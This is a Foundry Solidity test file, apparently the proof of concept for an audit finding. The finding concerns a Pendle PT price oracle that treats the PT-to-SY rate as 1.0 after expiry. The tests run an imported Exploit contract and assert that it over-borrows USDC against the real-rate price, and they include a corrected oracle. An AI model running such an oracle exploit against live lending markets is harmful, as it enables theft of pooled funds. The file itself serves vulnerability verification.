// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    IBaseToUSD,
    IPendleMarket,
    IPendleOracle,
    IERC20Decimals
} from "./35123-h-10-incorrect-assumption-that-pt-rate-is-10-post-expiry-she.sol";

/// Same price formula. After expiry it still uses Pendle's PT-to-SY rate.
contract PendlePTOracleFixed {
    IBaseToUSD public baseToUSDOracle;
    IPendleOracle public pendleOracle;
    address public pendleMarket;
    int256 public baseToUSDDecimals;
    int256 public ptDecimals;
    int256 public constant rateDecimals = 10**18;

    constructor(address feeds, address pendle, address market) {
        baseToUSDOracle = IBaseToUSD(feeds);
        pendleOracle = IPendleOracle(pendle);
        pendleMarket = market;
        uint8 _baseDecimals = baseToUSDOracle.decimals();
        (/* */, address pt, /* */) = IPendleMarket(market).readTokens();
        uint8 _ptDecimals = IERC20Decimals(pt).decimals();
        baseToUSDDecimals = int256(10**_baseDecimals);
        ptDecimals = int256(10**_ptDecimals);
    }

    function latestAnswer() external view returns (int256 answer) {
        (, int256 baseToUSD,,,) = baseToUSDOracle.latestRoundData();
        require(baseToUSD > 0, "Chainlink Rate Error");
        int256 ptRate = int256(pendleOracle.getPtToSyRate(pendleMarket, 1800));
        answer = (ptRate * baseToUSD * rateDecimals) / (baseToUSDDecimals * ptDecimals);
    }
}

contract Finding35123Test is Test {
    function test_exploit_post_expiry_rate_overborrows() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.price(), e.BUGGY_PRICE(), "oracle used 1.0");
        assertEq(e.borrowed(), 3590000000, "borrowed USDC units");
        assertEq(e.usdc().balanceOf(address(e)), 3590000000, "attacker balance");
        assertGt(e.borrowed(), e.FAIR_BORROW(), "above the real-rate borrow");
        assertEq(e.oracle().expiry(), 0, "already expired");
        assertEq(e.oracle().ptDecimals(), int256(1e18), "not the 6-decimal divisor bug");
    }

    function test_control_real_sy_rate_matches_fair_borrow() public {
        Exploit e = new Exploit();
        PendlePTOracleFixed fixedOracle = new PendlePTOracleFixed(
            address(e.feeds()),
            address(e.pendle()),
            address(e.market())
        );

        assertEq(fixedOracle.ptDecimals(), int256(1e18), "18 decimal PT");
        assertEq(e.pendle().getPtToSyRate(address(e.market()), 1800), e.REAL_SY_RATE(), "0.9598002817");
        assertEq(fixedOracle.latestAnswer(), e.FAIR_PRICE(), "real-rate price");
        assertEq(e.oracle().latestAnswer(), e.BUGGY_PRICE(), "hardcoded 1.0 price");

        uint256 fairBorrow = e.vault().quoteBorrow(fixedOracle.latestAnswer(), e.ONE_PT());
        uint256 buggyBorrow = e.vault().quoteBorrow(e.oracle().latestAnswer(), e.ONE_PT());
        assertEq(fairBorrow, 3445683011, "fair borrow of 1 PT");
        assertEq(buggyBorrow, 3590000000, "borrow at rate 1.0");
        assertEq(buggyBorrow - fairBorrow, 144316989, "extra USDC units");

        e.run();
        assertEq(e.borrowed(), buggyBorrow, "run borrowed the 1.0 amount");
        assertGt(e.borrowed(), fairBorrow, "control borrow is smaller");
    }
}
